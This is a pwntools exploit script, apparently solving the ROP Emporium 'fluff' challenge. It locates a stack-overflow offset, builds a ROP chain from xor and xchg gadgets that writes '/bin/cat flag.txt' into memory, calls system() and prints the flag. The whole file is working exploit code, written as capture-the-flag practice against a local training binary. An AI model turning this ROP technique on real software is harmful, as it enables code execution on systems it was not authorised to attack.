#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fluff
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fluff')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

#context.log_level = 'debug'
io = process(exe.path)
io.sendline(cyclic(511))
io.wait()
core = io.corefile
stack = core.rsp
info("stack: %#x", stack)
pattern = core.read(stack, 4)
offset = cyclic_find(pattern)
info("pattern: %r", pattern)
info("offset:  %d", offset)

# CONSTANTS
#system = 0x4005e0 # 0x400810
system = 0x400810
#system = 0x40080b
pop_rdi = 0x4008c3
zero_r11_pop_r14 = 0x400822
pop_r12_mov_r13 = 0x400832
xor_r11_r12_pop_r12 = 0x40082f
xchg_r11_r10_pop_r15 = 0x400840
mov1011_pop13_pop12_xorb1012 = 0x40084e

got_addr = 0x601028
got_addr = 0x601068
bin_cat_a = 0x2f62696e2f636174
bin_cat_b = 0x20666c61672e7478
bin_cat_c = 0x7400000000000000

# NOTE: I specify endian="BIG" for the strings so I don't have 
# to reverse the bytes from the conversion tool
payload = fit({
    offset: [

        p64(zero_r11_pop_r14),  # prepare r11 (do I need to?)
        p64(0xdeadbeef),
        p64(pop_r12_mov_r13),
        p64(got_addr),          # this puts the addr in r12 
        p64(xor_r11_r12_pop_r12),  # copy prt to r11
        p64(0xdeadbeef),
        p64(xchg_r11_r10_pop_r15),
        p64(0xdeadbeef),
        p64(zero_r11_pop_r14),  # prepare r11 (do I need to?)
        p64(0xdeadbeef),
        p64(pop_r12_mov_r13),
        p64(bin_cat_a, endian="big"),          # this puts the addr in r12 
        p64(xor_r11_r12_pop_r12),  # copy prt to r11
        p64(0xdeadbeef),
        p64(mov1011_pop13_pop12_xorb1012),
        p64(0xdeadbeef),
        p64(0x00),


        p64(zero_r11_pop_r14),  # prepare r11 (do I need to?)
        p64(0xdeadbeef),
        p64(pop_r12_mov_r13),
        p64(got_addr+8),          # this puts the addr in r12 
        p64(xor_r11_r12_pop_r12),  # copy prt to r11
        p64(0xdeadbeef),
        p64(xchg_r11_r10_pop_r15),
        p64(0xdeadbeef),
        p64(zero_r11_pop_r14),  # prepare r11 (do I need to?)
        p64(0xdeadbeef),
        p64(pop_r12_mov_r13),
        p64(bin_cat_b, endian="big"),          # this puts the addr in r12 
        p64(xor_r11_r12_pop_r12),  # copy prt to r11
        p64(0xdeadbeef),
        p64(mov1011_pop13_pop12_xorb1012),
        p64(0xdeadbeef),
        p64(0x00),

        p64(zero_r11_pop_r14),  # prepare r11 (do I need to?)
        p64(0xdeadbeef),
        p64(pop_r12_mov_r13),
        p64(got_addr+16),          # this puts the addr in r12 
        p64(xor_r11_r12_pop_r12),  # copy prt to r11
        p64(0xdeadbeef),
        p64(xchg_r11_r10_pop_r15),
        p64(0xdeadbeef),
        p64(zero_r11_pop_r14),  # prepare r11 (do I need to?)
        p64(0xdeadbeef),
        p64(pop_r12_mov_r13),
        p64(bin_cat_c, endian="big"),          # this puts the addr in r12 
        p64(xor_r11_r12_pop_r12),  # copy prt to r11
        p64(0xdeadbeef),
        p64(mov1011_pop13_pop12_xorb1012),
        p64(0xdeadbeef),
        p64(0x00),


        p64(pop_rdi),
        p64(got_addr),

#        p64(0x400815),
#        p64(0xdeadbeef),
        p64(0x4005b9),
#        p64(0x4005b9),
#        p64(0x4005b9),
#        p64(0x4005b9),
#        p64(0x4005b9),
#        p64(0x4005b9),
#        p64(0x4005b9),

#        p64(0x4005b9),
#        p64(0x4005b9),
#        p64(0x4005b9),
#        p64(0x4005b9),
#        p64(0x4005b9),
#        p64(0x4005b9),
#        p64(0x4005b9),

        
        
        
        
        
        
        
        p64(system),
        
#        p64(0x4007a4),
        
        
        ]
    })

with open('payload.dat', 'wb') as out_file:
    out_file.write(payload)

io = process(exe.path)
io.sendline(payload)
io.wait_for_close()
lines = io.recv().decode().split('\n')
flag = None
for line in lines:
    if 'flag' in line:
        flag = line
        break
success(flag)

